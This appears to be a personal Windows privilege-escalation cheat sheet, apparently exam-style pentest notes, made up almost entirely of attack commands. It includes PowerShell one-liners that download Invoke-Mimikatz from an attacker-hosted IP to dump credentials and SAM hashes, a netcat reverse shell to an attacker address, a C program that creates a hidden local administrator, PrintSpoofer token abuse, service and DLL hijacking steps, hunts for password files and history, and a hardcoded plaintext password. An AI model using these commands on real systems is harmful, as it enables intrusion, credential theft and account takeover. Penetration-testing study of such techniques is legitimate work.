# windows privesc
basic windows privilege escalation, since i have trouble parsing through the torrent of false-positives from standard tools

### // privesc checklist
```
https://parzival.sh/blog/my-oscp-notes-and-resources
    PowerShell Empire has some great PS1 scripts readily available such as Invoke-Watson and Invoke-MS16032 as examples. Their Mimikatz.ps1 is also great. These can be accessed at the following location Kali: /usr/share/powershell-empire/empire/server/data/module_source/
    Use the following command to search for cleartext passwords in registry: reg query HKCU /f password /t REG_SZ /s
    Be careful using commands ripped from other sites, make sure you understand what they are doing and how to modify them. An example for the previous note is modifying it to be more broad: reg query HKCU /f pass /t REG_SZ /s
    Windows binaries are ready to go on Kali: /usr/share/windows-binaries
    Fix your Windows path with the following command: set PATH=%SystemRoot%\system32;%SystemRoot%;
    Unable to get Mimikatz onto a machine? Simply host a http server and execute the following:

powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam

    Check out C:\Program Files (x86) for any outdated and vulnerable installations.
    If Administrator credentials have been obtained but you can’t get an interactive shell then strongly consider using the runas command in combination with a binary like netcat: runas /env /profile /user:[DOMAIN]\Administrator "C:\Windows\Tasks\nc.exe -e cmd.exe $attackerip 443"
    Mimikatz errors? Need to downgrade your version? Use the version availabke at this link.

Additional Windows Privilege Escalation Resources

Some additional resources I referenced throughout Windows privilege escalation

    0x1 Gitlab
    Juicy Potato Walkthrough
    https://github.com/SecWiki/windows-kernel-exploits
    Windows Exploit Suggester

```

### // sitational awareness
```
whoami /groups
powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember adminteam
Get-LocalGroupMember Administrators
systeminfo
ipconfig /all
route print
netstat -ano
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process
```

### // hidden in plain view
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\mysql\bin\my.ini
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### // powershell info
```
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Public\Transcripts\transcript01.txt
```

### // enter pssession
```
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

### // service binary hijacking .. find what services you can replace the binary of
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "icacls "C:\xampp\mysql\bin\mysqld.exe"
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
.. you can restart the system to initiate a service restart
```

### // create user c program
```
#include <stdlib.h>
int main (){int i;i = system ("net user dave2 password123! /add");i = system ("net localgroup administrators dave2 /add");return 0;}
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### // service DLL hijacking .. hijack a dll and gain execution as the parent process
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\Documents\BetaServ.exe
Restart-Service BetaService
```

### // unquoted service path .. abuse windows behavior by placing a malicious bin higher in a service path
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

### // scheduled task privesc
```
schtasks /query /fo LIST /v
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

### // print spooler exploit .. SeImpersonatePrivilege?
```
whoami /priv
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
```

### // on-target Windows enumeration / privesc
```
#weak folder permissions
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
